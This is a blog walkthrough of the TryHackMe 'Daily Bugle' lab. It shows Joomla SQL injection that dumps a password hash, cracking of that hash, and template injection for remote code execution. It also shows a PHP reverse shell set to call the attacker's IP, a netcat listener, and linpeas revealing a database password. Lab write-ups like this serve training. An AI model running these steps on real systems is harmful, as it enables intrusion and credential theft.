@@ -1,0 +1,310 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Daily Bugle | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Daily Bugle from TryHackMe."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/31_daily_bugle/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Daily Bugle</h1> <p class="post-description">Daily Bugle from TryHackMe.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="THM Daily Bugle Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://tryhackme.com/room/dailybugle" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Welcome to the Daily Bugle. We will get the scoop on Spidey.</p> <p>Run nmap to get a list of the services running.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.167.104
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-18 23:44 AEDT
+Nmap scan report <span class="k">for </span>10.10.167.104
+Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.6.40<span class="o">)</span>
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.6.40
+|_http-title: Home
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+3306/tcp open  mysql   MariaDB 10.3.23 or earlier <span class="o">(</span>unauthorized<span class="o">)</span>
+Aggressive OS guesses: Linux 4.4 <span class="o">(</span>97%<span class="o">)</span>, Android 9 - 10 <span class="o">(</span>Linux 4.9 - 4.14<span class="o">)</span> <span class="o">(</span>96%<span class="o">)</span>, Linux 4.15 <span class="o">(</span>96%<span class="o">)</span>, Linux 3.2 - 4.14 <span class="o">(</span>96%<span class="o">)</span>, Linux 4.15 - 5.19 <span class="o">(</span>96%<span class="o">)</span>, Linux 2.6.32 - 3.10 <span class="o">(</span>96%<span class="o">)</span>, Linux 3.10 - 3.13 <span class="o">(</span>95%<span class="o">)</span>, Linux 5.4 <span class="o">(</span>95%<span class="o">)</span>, Linux 2.6.32 - 3.5 <span class="o">(</span>94%<span class="o">)</span>, Linux 2.6.32 - 3.13 <span class="o">(</span>94%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 4 hops
+
+TRACEROUTE <span class="o">(</span>using port 110/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+1   9.80 ms   10.4.0.1
+2   ... 3
+4   260.67 ms 10.10.167.104
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>37.15 seconds
+</code></pre></div></div> <p><br> Run the vuln category of nmap scripts hoping to find low-hanging fruit…and a vulnerability we can exploit.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--script</span> vuln <span class="nt">-oN</span> vulnchk 10.10.167.104
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-18 23:44 AEDT
+Nmap scan report <span class="k">for </span>10.10.167.104
+Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+| http-vuln-cve2017-8917: 
+|   VULNERABLE:
+|   Joomla! 3.7.0 <span class="s1">'com_fields'</span> SQL Injection Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-8917
+|     Risk <span class="nb">factor</span>: High  CVSSv3: 9.8 <span class="o">(</span>CRITICAL<span class="o">)</span> <span class="o">(</span>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H<span class="o">)</span>
+|       An SQL injection vulnerability <span class="k">in </span>Joomla! 3.7.x before 3.7.1 allows attackers
+|       to execute aribitrary SQL commands via unspecified vectors.
+|       
+|     Disclosure <span class="nb">date</span>: 2017-05-17
+|     Extra information:
+|       User: root@localhost
+|     References:
+|       https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-8917
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Check the Landing Page of the website.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Landing Page" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Look for a script to exploit the SQL injection exploit listed in the nmap vulnerability output.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/script.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="SQLi Script" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py" rel="external nofollow noopener" target="_blank">https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py</a></p> <p><br> Download the exploit to our local working folder.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span>wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/refs/heads/master/joomblah.py
+<span class="nt">--2025-02-19</span> 00:11:58--  https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/refs/heads/master/joomblah.py
+Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.111.133, 2606:50c0:8001::154, 2606:50c0:8000::154, ...
+Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6040 <span class="o">(</span>5.9K<span class="o">)</span> <span class="o">[</span>text/plain]
+Saving to: ‘joomblah.py’
+
+joomblah.py                                                100%[<span class="o">========================================================================================================================================&gt;]</span>   5.90K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.002s  
+
+2025-02-19 00:11:59 <span class="o">(</span>3.75 MB/s<span class="o">)</span> - ‘joomblah.py’ saved <span class="o">[</span>6040/6040]
+</code></pre></div></div> <p><br> Run the python script to dump the users table.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span>python joomblah.py http://10.10.167.104
+/home/kali/Documents/thm/bugle/joomblah.py:160: SyntaxWarning: invalid escape sequence <span class="s1">'\ '</span>
+  logo <span class="o">=</span> <span class="s2">"""
+                                                                                                                    
+    .---.    .-'''-.        .-'''-.                                                           
+    |   |   '   _    </span><span class="se">\ </span><span class="s2">    '   _    </span><span class="se">\ </span><span class="s2">                           .---.                        
+    '---' /   /</span><span class="sb">`</span> <span class="s1">'.   \  /   /` '</span><span class="nb">.</span>   <span class="se">\ </span> __  __   ___   /|        |   |            <span class="nb">.</span>           
+    .---..   |     <span class="se">\ </span> <span class="s1">' .   |     \  '</span> |  |/  <span class="sb">`</span><span class="s2">.'   </span><span class="sb">`</span><span class="nb">.</span> <span class="o">||</span>        |   |          .<span class="s1">'|           
+    |   ||   '</span>      |  <span class="s1">'|   '</span>      |  <span class="s1">'|   .-.  .-.   '</span><span class="o">||</span>        |   |         &lt;  |           
+    |   |<span class="se">\ </span>   <span class="se">\ </span>    / / <span class="se">\ </span>   <span class="se">\ </span>    / / |  |  |  |  |  <span class="o">||</span>|  __    |   |    __    | |           
+    |   | <span class="sb">`</span><span class="s2">.   </span><span class="sb">`</span> ..<span class="s1">' /   `.   ` ..'</span> /  |  |  |  |  |  <span class="o">||</span>|/<span class="s1">'__ '</span><span class="nb">.</span> |   | .:--.<span class="s1">'.  | | .'''</span>-.    
+    |   |    <span class="s1">'-...-'</span><span class="sb">`</span><span class="s2">       '-...-'</span><span class="sb">`</span>   |  |  |  |  |  <span class="o">||</span>:/<span class="sb">`</span><span class="s2">  '. '|   |/ |   </span><span class="se">\ </span><span class="s2">| | |/.'''. </span><span class="se">\ </span><span class="s2">  
+    |   |                              |  |  |  |  |  |||     | ||   |</span><span class="sb">`</span><span class="s2">" __ | | |  /    | |   
+    |   |                              |__|  |__|  |__|||</span><span class="se">\ </span><span class="s2">   / '|   | .'.''| | | |     | |   
+ __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
+|      '                                               '  </span><span class="sb">`</span><span class="s1">'-'</span><span class="sb">`</span><span class="s2">       </span><span class="se">\ \.</span><span class="s2">_,</span><span class="se">\ </span><span class="s2">'/| '.    | '.  
+|____.'                                                                </span><span class="sb">`</span><span class="nt">--</span><span class="s1">'  `" '</span><span class="nt">---</span><span class="s1">'   '</span><span class="nt">---</span><span class="s1">' 
+
+ [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: fb9j5_users
+  -  Extracting users from fb9j5_users
+ [$] Found user ['</span>811<span class="s1">', '</span>Super User<span class="s1">', '</span>jonah<span class="s1">', '</span>jonah@tryhackme.com<span class="s1">', '</span><span class="nv">$2y$10$0veO</span>/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm<span class="s1">', '', '']
+  -  Extracting sessions from fb9j5_session
+</span></code></pre></div></div> <p><br> Create a file containing the hash so we can pass it to john the ripper.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hashes.txt                 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 1024 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+spiderman123     <span class="o">(</span>jonah<span class="o">)</span>     
+1g 0:00:05:44 DONE <span class="o">(</span>2025-02-19 00:38<span class="o">)</span> 0.002902g/s 135.9p/s 135.9c/s 135.9C/s thelma1..speciala
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div> <p><br> Authenticate into the /administrator/ section with the creds we just extracted.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/dashboard.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Dashboard" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Try to SSH with the credentials, maybe we will get lucky. Nope!</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span>ssh james@10.10.167.104                       
+james@10.10.167.104<span class="s1">'s password: 
+Permission denied, please try again.
+james@10.10.167.104'</span>s password:
+</code></pre></div></div> <p><br> Perform more research about the vulnerabilities associated with Joomla. Apperently, we can abuse the template section. So from the Extensions menu, rollover Templates, and Select Templates.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/templates.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Templates" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Download Pentest Monkey’s PHP reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span>wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php <span class="nt">-O</span> shell.php
+<span class="nt">--2025-02-19</span> 00:54:47--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
+Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.108.133, 2606:50c0:8000::154, 2606:50c0:8002::154, ...
+Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5491 <span class="o">(</span>5.4K<span class="o">)</span> <span class="o">[</span>text/plain]
+Saving to: ‘shell.php’
+
+shell.php                                                  100%[<span class="o">========================================================================================================================================&gt;]</span>   5.36K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.003s  
+
+2025-02-19 00:54:47 <span class="o">(</span>1.76 MB/s<span class="o">)</span> - ‘shell.php’ saved <span class="o">[</span>5491/5491]
+</code></pre></div></div> <p><br> Update the IP and port in the script to whatever you are going to use as your lhost and lport.</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="nc">Documents</span><span class="o">/</span><span class="n">thm</span><span class="o">/</span><span class="n">bugle</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">cat</span> <span class="n">shell</span><span class="mf">.</span><span class="n">php</span>               
+<span class="o">&lt;?</span><span class="n">php</span>
+<span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
+<span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
+<span class="c1">//</span>
+<span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility</span>
+<span class="c1">// for any actions performed using this tool.  The author accepts no liability</span>
+<span class="c1">// for damage caused by this tool.  If these terms are not acceptable to you, then</span>
+<span class="c1">// do not use this tool.</span>
+<span class="c1">//</span>
+
+<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
+
+<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.4.119.29'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="mi">443</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
+<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
+</code></pre></div></div> <p><br> Click on the New File button.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/newfile.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Click New File" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Don’t monkey about and choose the Pentest Monkey’s file.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/monkey.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Choose File" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Upload the file and notice the big error message indicating that the upload file.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/error.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Error" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Giving it a think, one of the common ways I like to pop Wordpress is injecting php into themes. Twenty-sixteen 404.php for the win! Let’s see if we can’t do something similar with templates. We can add a small system line into the error.php file in the beez3 template.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/inject.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Inject" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> We can pass ls to the cmd parameter to test the RCE.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/testrce.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Test RCE" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Get a one-liner from the trusty revshells.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/revshells.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Revshells" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.revshells.com/" rel="external nofollow noopener" target="_blank">https://www.revshells.com/</a></p> <p><br> Paste the exploit one-line into the cmd paramter end execute.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/exploit.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Exploit" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the listener and catch the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.4.119.29] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.167.104] 60952
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span>
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+bash-4.2<span class="err">$</span>
+</code></pre></div></div> <p><br> Download linpeas.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span>wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh
+<span class="nt">--2025-02-19</span> 01:16:25--  https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh
+Resolving github.com <span class="o">(</span>github.com<span class="o">)</span>... 4.237.22.38
+Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span>|4.237.22.38|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/fb023db6-ffeb-4579-9efa-20dcaf35eac7?X-Amz-Algorithm<span class="o">=</span>AWS4-HMAC-SHA256&amp;X-Amz-Credential<span class="o">=</span>releaseassetproduction%2F20250218%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date<span class="o">=</span>20250218T141629Z&amp;X-Amz-Expires<span class="o">=</span>300&amp;X-Amz-Signature<span class="o">=</span>0efe0201dbac8598e70b197f3a0c2ee23486d8d75c44686a37f56b03fc4236e6&amp;X-Amz-SignedHeaders<span class="o">=</span>host&amp;response-content-disposition<span class="o">=</span>attachment%3B%20filename%3Dlinpeas.sh&amp;response-content-type<span class="o">=</span>application%2Foctet-stream <span class="o">[</span>following]
+<span class="nt">--2025-02-19</span> 01:16:25--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/fb023db6-ffeb-4579-9efa-20dcaf35eac7?X-Amz-Algorithm<span class="o">=</span>AWS4-HMAC-SHA256&amp;X-Amz-Credential<span class="o">=</span>releaseassetproduction%2F20250218%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date<span class="o">=</span>20250218T141629Z&amp;X-Amz-Expires<span class="o">=</span>300&amp;X-Amz-Signature<span class="o">=</span>0efe0201dbac8598e70b197f3a0c2ee23486d8d75c44686a37f56b03fc4236e6&amp;X-Amz-SignedHeaders<span class="o">=</span>host&amp;response-content-disposition<span class="o">=</span>attachment%3B%20filename%3Dlinpeas.sh&amp;response-content-type<span class="o">=</span>application%2Foctet-stream
+Resolving objects.githubusercontent.com <span class="o">(</span>objects.githubusercontent.com<span class="o">)</span>... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
+Connecting to objects.githubusercontent.com <span class="o">(</span>objects.githubusercontent.com<span class="o">)</span>|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 840082 <span class="o">(</span>820K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                                 100%[<span class="o">========================================================================================================================================&gt;]</span> 820.39K  3.05MB/s    <span class="k">in </span>0.3s    
+
+2025-02-19 01:16:26 <span class="o">(</span>3.05 MB/s<span class="o">)</span> - ‘linpeas.sh’ saved <span class="o">[</span>840082/840082]
+
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span>python <span class="nt">-m</span> <span class="s1">'http.server'</span>         
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</code></pre></div></div> <p><br> Transfer linpeas.sh to the victim machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span>wget 10.4.119.29:8000/linpeas.sh
+wget 10.4.119.29:8000/linpeas.sh
+<span class="nt">--2025-02-18</span> 09:17:31--  http://10.4.119.29:8000/linpeas.sh
+Connecting to 10.4.119.29:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 840082 <span class="o">(</span>820K<span class="o">)</span> <span class="o">[</span>text/x-sh]
+Saving to: <span class="s1">'linpeas.sh'</span>
+
+100%[<span class="o">======================================&gt;]</span> 840,082      418KB/s   <span class="k">in </span>2.0s   
+
+2025-02-18 09:17:34 <span class="o">(</span>418 KB/s<span class="o">)</span> - <span class="s1">'linpeas.sh'</span> saved <span class="o">[</span>840082/840082]
+
+bash-4.2<span class="nv">$ </span><span class="nb">chmod</span> +x linpeas.sh
+<span class="nb">chmod</span> +x linpeas.sh
+</code></pre></div></div> <p><br> Run the linpeas.sh script.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span>./linpeas.sh
+./linpeas.sh
+
+&lt;snip&gt;
+
+╔══════════╣ Searching passwords <span class="k">in </span>config PHP files
+/var/www/html/configuration.php:        public <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'nv5uz9r3ZEDzVjNu'</span><span class="p">;</span>                                                                                                                                                              
+/var/www/html/libraries/joomla/log/logger/database.php:                 <span class="nv">$this</span>-&gt;password <span class="o">=</span> <span class="o">(</span>empty<span class="o">(</span><span class="nv">$this</span>-&gt;options[<span class="s1">'db_pass'</span><span class="o">]))</span> ? <span class="s1">''</span> : <span class="nv">$this</span>-&gt;options[<span class="s1">'db_pass'</span><span class="o">]</span><span class="p">;</span>
+/var/www/html/libraries/joomla/log/logger/database.php:                 <span class="nv">$this</span>-&gt;password <span class="o">=</span> null<span class="p">;</span>
